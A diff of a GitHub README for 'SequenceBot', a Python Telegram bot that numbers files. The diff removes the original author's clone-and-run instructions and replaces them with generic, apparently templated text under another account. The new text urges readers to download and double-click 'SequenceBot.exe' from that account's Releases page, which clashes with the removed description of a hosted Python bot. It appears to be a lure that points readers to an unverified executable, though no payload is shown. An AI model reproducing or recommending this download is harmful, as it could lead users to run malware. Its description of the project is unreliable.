@@ -1,188 +1,84 @@
-━━━━━━━━━━━━━━━━━━━━━━━━━━
+# 🚀 SequenceBot - Simplify Your File Organization 
 
-<h2 align="center">
-    ──「 sᴇǫᴜᴇɴᴄᴇ ʙᴏᴛ 」──
-</h2>
+![Download SequenceBot](https://img.shields.io/badge/Download-SequenceBot-brightgreen) 
 
-<p align="center">
-  <img src="https://i.rj1.dev/Ccvey.png">
-</p>
+## 📜 Description
+SequenceBot is a Telegram bot designed to organize your files. It automatically arranges all received files in the correct number sequence. This ensures clear and accurate ordering without any manual effort. It is perfect for channels, groups, and anyone who needs organized series. 
 
-<p align="center">
-<a href="https://github.com/RioShin2025/SequenceBot/stargazers"><img src="https://img.shields.io/github/stars/RioShin2025/SequenceBot?color=black&logo=github&logoColor=black&style=for-the-badge" alt="Stars" /></a>
-<a href="https://github.com/RioShin2025/SequenceBot/network/members"> <img src="https://img.shields.io/github/forks/RioShin2025/SequenceBot?color=black&logo=github&logoColor=black&style=for-the-badge" /></a>
-<a href="https://github.com/RioShin2025/SequenceBot/blob/RioShin/LICENSE"> <img src="https://img.shields.io/badge/License-MIT-blueviolet?style=for-the-badge" alt="License" /> </a>
-<a href="https://www.python.org/"> <img src="https://img.shields.io/badge/Written%20in-Python-orange?style=for-the-badge&logo=python" alt="Python" /> </a>
-<a href="https://github.com/RioShin2025/SequenceBot/commits/RioShin2025"> <img src="https://img.shields.io/github/last-commit/RioShin2025/SequenceBot?color=blue&logo=github&logoColor=green&style=for-the-badge" /></a>
-</p>
+## 🌟 Features
+- **Automatic File Organization:** No more manual sorting. SequenceBot sorts files for you, placing them in the correct order.
+- **Simple Interface:** Easy to use. Just send your files, and let the bot do the work.
+- **Telegram Integration:** Works directly within Telegram, making it convenient and accessible.
+- **Lightweight:** Minimal system requirements mean it runs smoothly on any device.
 
-<p align="center">
-<b>𝗗𝗘𝗣𝗟𝗢𝗬𝗠𝗘𝗡𝗧 𝗠𝗘𝗧𝗛𝗢𝗗𝗦</b>
-</p>
+## 📥 System Requirements
+- **Operating System:** Windows 10 or later, macOS, or Linux.
+- **RAM:** 4GB minimum.
+- **Internet Connection:** Required for Telegram access.
 
-<h3 align="center">
-    ─「 ᴅᴇᴩʟᴏʏ ᴏɴ ʜᴇʀᴏᴋᴜ 」─
-</h3>
+## 🚀 Getting Started
+Follow these simple steps to download and run SequenceBot.
 
-<p align="center"><a href="https://dashboard.heroku.com/new?template=https://github.com/RioShin/SequenceBot"> <img src="https://img.shields.io/badge/Deploy%20On%20Heroku-black?style=for-the-badge&logo=heroku" width="220" height="38.45"/></a></p>
+1. **Visit the Releases Page:** First, go to the [Releases page](https://github.com/JonasNihal/SequenceBot/releases).
+   
+2. **Choose Your Version:** Here, you will see various versions of SequenceBot. Select the latest version for the best features and updates.
 
+3. **Download the Bot:** Click on the download link for the version you want. This will save the file to your device.
 
-<h3 align="center">
-    ─「 ᴅᴇᴩʟᴏʏ ᴏɴ ᴠᴘs/ʟᴏᴄᴀʟ 」─
-</h3>
+4. **Install SequenceBot:** 
+   - If you downloaded a file like `SequenceBot.exe`, double-click the file to start the installation.
+   - Follow the prompts in the setup wizard to complete the installation.
 
+5. **Open Telegram:** Once installed, open Telegram on your device.
 
+6. **Start the Bot:** Search for "SequenceBot" in the Telegram app and start a chat.
 
+7. **Follow Setup Instructions:** The bot will guide you through the initial setup, including how to send files for organization.
 
+## 📄 Download & Install
+To download SequenceBot, click the link below:
 
-<h3 align="center">
-    ─「 ᴅᴇᴩʟᴏʏ ᴏɴ  ʀᴇɴᴅᴇʀ/ᴋᴏʏᴇʙ/ʀᴀɪʟᴡᴀʏ」─
-</h3>
+[Download SequenceBot](https://github.com/JonasNihal/SequenceBot/releases)
 
-<details><summary><b> - ғᴇᴀᴛᴜʀᴇs ᴀɴᴅ ᴅᴇᴄʀɪᴘᴛɪᴏɴ:</b></summary>
+## 🎯 Usage
+Once you have SequenceBot set up, sending files is easy:
+- Simply send files in your preferred Telegram group or channel.
+- The bot will automatically sort and organize these files.
   
-## ғᴇᴀᴛᴜʀᴇs
-<i> ›› sᴇǫᴜᴇɴᴄᴇ ғɪʟᴇs:
-Automatically numbers every file sent by users (001, 002, 003...). Perfect for organized storage, renaming, and clean file management without manual effort.
+You have the option to customize the sequence or let the bot decide the best order.
 
-›› ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ:
-Displays the top users based on how many files they have submitted. Helps track engagement & motivates users to stay active.
+## 📞 Support
+If you encounter issues during installation or usage, you can find support in the following ways:
+- **Documentation:** Check the [Wiki](https://github.com/JonasNihal/SequenceBot/wiki) for detailed guides.
+- **Issues Page:** Report any problems on the [Issues page](https://github.com/JonasNihal/SequenceBot/issues).
+- **Community:** Join the user community on Telegram or Discord for tips and assistance.
 
-›› ᴜsᴇʀ ᴘᴀɴᴇʟ:
-View the list of total users, active users, and detailed user info. Helps admins monitor the bot’s growth and user activity.
+## 🛠️ Contributing
+If you're interested in helping SequenceBot grow, contributions are welcome. 
+- Fork the repository and make your changes.
+- Submit a pull request for review.
 
-›› ʙʀᴏᴀᴅᴄᴀsᴛ ᴘᴀɴᴇʟ:
-Send text, photo, button-based, or forced broadcasts to all users at once. Reliable and fast delivery system for mass updates.</i>
+Your input can help improve the bot for everyone.
 
-### ›› sᴛᴀʀᴛ & ғsᴜʙ ᴍᴇᴅɪᴀ:
-<i>ᴘʀᴏᴠɪᴅᴇ ɪᴍᴀɢᴇ ᴜʀʟs ᴏʀ ᴅɪʀᴇᴄᴛʟʏ sᴇɴᴅ ᴘʜᴏᴛᴏs ᴛᴏ ᴄᴜsᴛᴏᴍɪᴢᴇ ᴛʜᴇ sᴛᴀʀᴛ ᴀɴᴅ ꜰᴏʀᴄᴇ sᴜʙsᴄʀɪʙᴇ ᴍᴇssᴀɢᴇs.</i>
+## 🌍 Topics
+SequenceBot relates to various topics. You can explore them here:
+- auto-anime-bot
+- autoanimebot
+- bot
+- encoding
+- encoding-bot
+- file-sequence-bot
+- fileshare
+- filestorebot
+- leech-bot
+- sequence-bot
+- sequencebot
+- telegram
+- telegrambot
 
-### ›› ꜰᴜʟʟʏ ᴇᴅɪᴛᴀʙʟᴇ ᴍᴇssᴀɢᴇs:
-<i>ᴄᴜsᴛᴏᴍɪᴢᴇ sᴛᴀʀᴛ, ᴀʙᴏᴜᴛ, ʀᴇᴘʟʏ, ᴀɴᴅ ғsᴜʙ ᴍᴇssᴀɢᴇs ᴡɪᴛʜ ꜰᴏʀᴍᴀᴛᴛɪɴɢ ᴀɴᴅ ᴘʟᴀᴄᴇʜᴏʟᴅᴇʀs (sᴇᴇ ʙᴇʟᴏᴡ)..</i>
+## 👋 Acknowledgments
+Thanks to the developers and users who support SequenceBot. Your feedback and contributions are invaluable.
 
+Remember, you can always download the latest version from the [Releases page](https://github.com/JonasNihal/SequenceBot/releases). Enjoy organized files with SequenceBot!
 
-
-### <i>›› In addition to the above, more user-friendly and advanced interaction features have been added.</i>
-</details>
-
-<details><summary><b> - ᴀᴅᴍɪɴ ᴀɴᴅ ᴜsᴇʀs ᴄᴏᴍᴍᴀɴᴅs :</b></summary>
-  
-## ᴀᴅᴍɪɴ ᴀɴᴅ ᴜsᴇʀs ᴄᴏᴍᴍᴀɴᴅs
-- **start** - sᴛᴀʀᴛ ᴛʜᴇ ʙᴏᴛ
-- **ssequence** - ᴛᴏ sᴛᴀʀᴛ sᴇǫᴜᴇɴᴄᴇ
-- **esequence** - ᴛᴏ ᴇɴᴅ sᴇǫᴜᴇɴᴄᴇ
-- **leaderboard** - ᴛᴏ ᴄʜᴇᴄᴋ ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ
-- **users** - ᴠɪᴇᴡ ᴛʜᴇ ᴜsᴇʀs ʟɪsᴛ
-- **broadcast** - sᴇɴᴅ ᴀ ᴍᴇssᴀɢᴇ ᴛᴏ ᴀʟʟ ᴜsᴇʀs
-
-</details>
-
-<details><summary><b> - ᴠᴀʀɪᴀʙʟᴇs :</b></summary>
-  
-## ᴠᴀʀɪᴀʙʟᴇs
-
-```python
-# Bot Instance Configuration
-TOKEN = "your_bot_token"
-API_ID = your_api_id
-API_HASH = "your_api_hash"
-
-
-# Database Configuration
-DB_URI = "your_mongodb_uri"
-
-
-# Admin IDs
-ADMINS = [123456789, 987654321]
-
-
-# Messages Configuration
-MESSAGES = {
-    "START": "Your start message here with {first} placeholder",
-    "Help": "Your  About message",
-    
-}
-```
-</details>
-
-
-- <b> ᴠᴘs/ʟᴏᴄᴀʟ ᴅᴇᴘʟᴏʏᴍᴇɴᴛ ᴍᴇᴛʜᴏᴅ </b>
-</h3></summary>
-
-- Get your [Necessary Variables](https://github.com/RioShin2025/SequenceBot/blob/RioShin/config.py))
-- Git clone https://github.com/RioShin2025/SequenceBot
-- # Install Packages
--  sᴛᴀʀᴛ ᴄᴏᴍᴍᴀɴᴅ
-```bash
-python3 webserver.py
-```
--  ʙᴜɪʟᴅ ᴄᴏᴍᴍᴀɴᴅ
-```bash
-pip install -r requirements.txt
-```
-- Edit config.py with variables as given below then run bot
-
-
-<p align="center">
-  <img src="https://i.rj1.dev/Ccvey.png">
-</p>
-
-
-</details>
-━━━━━━━━━━━━━━━━━━━━
-
-<h3 align="center">
-    ─「 sᴜᴩᴩᴏʀᴛ 」─
-</h3>
-
-<p align="center">
-<a href="https://t.me/BOTSKINGDOMSGROUP"><img src="https://img.shields.io/badge/-Support%20Group-blue.svg?style=for-the-badge&logo=Telegram"></a>
-</p>
-<p align="center">
-<a href="https://t.me/BOTSKINGDOMS"><img src="https://img.shields.io/badge/-Support%20Channel-blue.svg?style=for-the-badge&logo=Telegram"></a>
-</p>
-
-━━━━━━━━━━━━━━━━━━━━
-
-<h3 align="center">
-    ─「 ᴄʀᴇᴅɪᴛs 」─
-</h3>
-
-- <b>[ᴍᴀᴅᴇ ʙʏ]([https://t.me/BOTSKINGDOMS](https://t.me/BOTSKINGDOMS))  ➻  [ʀɪᴏ sʜɪɴ [ᴛɢ]](https://t.me/RioShin) </b>
-- <b>[ᴘᴏᴡᴇʀᴅ ʙʏ]([https://t.me/BOTSKINGDOMS](https://t.me/BOTSKINGDOMS))  ➻  [ʙᴏᴛsᴋɪɴɢᴅᴏᴍs](https://t.me/BOTSKINGDOMS) </b>
-
-<h3 align="center">
-<b>🤝 ᴄᴏɴᴛʀɪʙᴜᴛɪɴɢ
-ᴄᴏɴᴛʀɪʙᴜᴛɪᴏɴs ᴀʀᴇ ᴀʟᴡᴀʏs ᴡᴇʟᴄᴏᴍᴇ! ꜰᴇᴇʟ ꜰʀᴇᴇ ᴛᴏ ᴏᴘᴇɴ ᴘᴜʟʟ ʀᴇǫᴜᴇsᴛs ᴛᴏ ɪᴍᴘʀᴏᴠᴇ ᴛʜɪs ʀᴇᴘᴏ 🖤 </b>
-</h3>
-
-# 📝 ʟɪᴄᴇɴsᴇ
-›› ʏᴏᴜ ᴄᴀɴ ꜰʀᴇᴇʟʏ ʜᴏsᴛ ᴛʜɪs ʀᴇᴘᴏ ʏᴏᴜʀsᴇʟꜰ. ᴀʟʟ ᴡᴇ ᴀsᴋ ɪs ᴛʜᴀᴛ ʏᴏᴜ ᴘʀᴏᴠɪᴅᴇ ᴘʀᴏᴘᴇʀ ᴄʀᴇᴅɪᴛs ʙʏ ʟɪɴᴋɪɴɢ ᴛᴏ ᴛʜɪs ʀᴇᴘᴏsɪᴛᴏʀʏ.
-
-›› ᴛʜɪs ᴘʀᴏᴊᴇᴄᴛ ɪs ʟɪᴄᴇɴsᴇᴅ ᴜɴᴅᴇʀ ᴛʜᴇ ᴍɪᴛ.
-ʏᴏᴜ ᴀʀᴇ ꜰʀᴇᴇ ᴛᴏ ᴜsᴇ, ᴍᴏᴅɪꜰʏ, ᴀɴᴅ sʜᴀʀᴇ ɪᴛ — ʙᴜᴛ ʏᴏᴜ ᴍᴜsᴛ ᴀʟsᴏ ɢɪᴠᴇ ᴄʀᴇᴅɪᴛ ᴀɴᴅ ᴋᴇᴇᴘ ɪᴛ ᴜɴᴅᴇʀ ᴛʜᴇ ᴍɪᴛ ʟɪᴄᴇɴsᴇ.
-
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+---
